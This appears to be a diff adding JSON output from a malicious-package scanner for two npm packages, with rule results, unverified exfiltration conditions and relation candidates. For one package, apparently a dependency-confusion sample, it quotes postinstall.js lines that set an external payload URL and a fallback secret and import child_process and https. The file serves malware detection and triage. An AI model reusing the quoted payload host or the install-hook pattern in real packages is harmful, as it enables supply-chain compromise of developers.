@@ -1,0 +1,173 @@
+[
+  {
+    "sampleId": "DD-NPM-002",
+    "subject": {
+      "sampleId": "DD-NPM-002",
+      "ecosystem": "npm",
+      "packageName": "@add-wallet-exchange/import-type",
+      "packageVersion": "1.0.0"
+    },
+    "selectionReasons": [
+      "RELATION_CANDIDATE"
+    ],
+    "diagnostics": [],
+    "relations": [
+      {
+        "analyzer": "custom-rule",
+        "relationId": "custom-relation:84e664cc3dd75ac1",
+        "sourceFindingIds": [
+          "custom-rule:custom.collection-source:0",
+          "custom-rule:custom.collection-source:1",
+          "custom-rule:custom.collection-source:2",
+          "custom-rule:custom.collection-source:3"
+        ],
+        "sinkFindingIds": [
+          "custom-rule:custom.network-outbound:5"
+        ],
+        "allFindingRefsPresent": true,
+        "missingFindingIds": [],
+        "semanticLinkProvenByCandidate": false,
+        "note": "CANDIDATE status and referential integrity do not prove data/execution/call linkage."
+      }
+    ],
+    "findingLocations": []
+  },
+  {
+    "sampleId": "DD-NPM-010",
+    "subject": {
+      "sampleId": "DD-NPM-010",
+      "ecosystem": "npm",
+      "packageName": "@cloudplatform-single-spa/installations",
+      "packageVersion": "99.99.99"
+    },
+    "selectionReasons": [
+      "M_REQUIRED_COMBINATION",
+      "RELATION_CANDIDATE"
+    ],
+    "diagnostics": [
+      {
+        "ruleId": "M04",
+        "category": "MALICIOUS",
+        "outcome": "UNVERIFIED",
+        "conditions": [
+          {
+            "condition": "HIT(threat-runtime-environment-read)",
+            "status": "SATISFIED",
+            "detail": "1 exact Raw Finding hit(s)"
+          },
+          {
+            "condition": "HIT(capability-network-outbound)",
+            "status": "SATISFIED",
+            "detail": "1 exact Raw Finding hit(s)"
+          },
+          {
+            "condition": "VALID",
+            "status": "SATISFIED",
+            "detail": "Required Findings have context and valid provenance"
+          },
+          {
+            "condition": "CREDENTIAL_OR_FULL_ENV_COLLECTION",
+            "status": "UNVERIFIED",
+            "detail": "AgentPlanningInputV0_1 has no verified semantic execution/data-flow assertion for this condition"
+          },
+          {
+            "condition": "EXTERNAL_EXFILTRATION_CONTEXT",
+            "status": "UNVERIFIED",
+            "detail": "AgentPlanningInputV0_1 has no verified semantic execution/data-flow assertion for this condition"
+          }
+        ],
+        "linked": {
+          "required": true,
+          "status": "UNVERIFIED",
+          "basis": []
+        },
+        "findingRefs": [
+          {
+            "analyzer": "guarddog",
+            "findingId": "guarddog:threat-runtime-environment-read:0"
+          },
+          {
+            "analyzer": "guarddog",
+            "findingId": "guarddog:capability-network-outbound:0"
+          }
+        ],
+        "evidenceRefs": [
+          {
+            "evidenceId": "DD-NPM-010-evidence-00019"
+          },
+          {
+            "evidenceId": "DD-NPM-010-evidence-00014"
+          }
+        ],
+        "blockingConditions": [
+          "CREDENTIAL_OR_FULL_ENV_COLLECTION",
+          "EXTERNAL_EXFILTRATION_CONTEXT"
+        ]
+      }
+    ],
+    "relations": [
+      {
+        "analyzer": "custom-rule",
+        "relationId": "custom-relation:bb3e7ffc2844e6e2",
+        "sourceFindingIds": [
+          "custom-rule:custom.lifecycle-entry:9"
+        ],
+        "sinkFindingIds": [
+          "custom-rule:custom.process-execution:11"
+        ],
+        "allFindingRefsPresent": true,
+        "missingFindingIds": [],
+        "semanticLinkProvenByCandidate": false,
+        "note": "CANDIDATE status and referential integrity do not prove data/execution/call linkage."
+      }
+    ],
+    "findingLocations": [
+      {
+        "analyzer": "guarddog",
+        "findingId": "guarddog:threat-runtime-environment-read:0",
+        "ruleId": "threat-runtime-environment-read",
+        "location": {
+          "type": "SOURCE_FILE",
+          "path": "scripts/postinstall.js",
+          "startLine": 17
+        },
+        "data": {
+          "guarddog": {
+            "resultRuleId": "threat-runtime-environment-read",
+            "rawResult": {
+              "location": "scripts/postinstall.js:17",
+              "code": "...t PAYLOAD_BASE = process.env.DEP_CONFUSION_PAYLOAD || 'https://oob.moika.tech/payload';\nconst SECRET       = process.env.DEP_CONFUSION_SECRET  || 'l95HdDaz3kQx1Zsg3WxH6HvKANf51RY1';\nconst NO_TELEMETRY = !!process.env.CLOUDPLATFORM_SINGLE_SPA_NO_TELEM...",
+              "match": "process.env.DEP_CONFUSION_SECRET",
+              "message": "Detects reading of environment variables (credential access, often contains secrets)"
+            }
+          },
+          "code": "...t PAYLOAD_BASE = process.env.DEP_CONFUSION_PAYLOAD || 'https://oob.moika.tech/payload';\nconst SECRET       = process.env.DEP_CONFUSION_SECRET  || 'l95HdDaz3kQx1Zsg3WxH6HvKANf51RY1';\nconst NO_TELEMETRY = !!process.env.CLOUDPLATFORM_SINGLE_SPA_NO_TELEM...",
+          "match": "process.env.DEP_CONFUSION_SECRET"
+        }
+      },
+      {
+        "analyzer": "guarddog",
+        "findingId": "guarddog:capability-network-outbound:0",
+        "ruleId": "capability-network-outbound",
+        "location": {
+          "type": "SOURCE_FILE",
+          "path": "scripts/postinstall.js",
+          "startLine": 11
+        },
+        "data": {
+          "guarddog": {
+            "resultRuleId": "capability-network-outbound",
+            "rawResult": {
+              "location": "scripts/postinstall.js:11",
+              "code": "const path = require('path');\nconst https = require('https');\nconst http  = require('http');\nconst { execSync, spawn } = require('child_process');",
+              "match": "require('https')",
+              "message": "Detects network request capabilities (HTTP, sockets, etc.)"
+            }
+          },
+          "code": "const path = require('path');\nconst https = require('https');\nconst http  = require('http');\nconst { execSync, spawn } = require('child_process');",
+          "match": "require('https')"
+        }
+      }
+    ]
+  }
+]
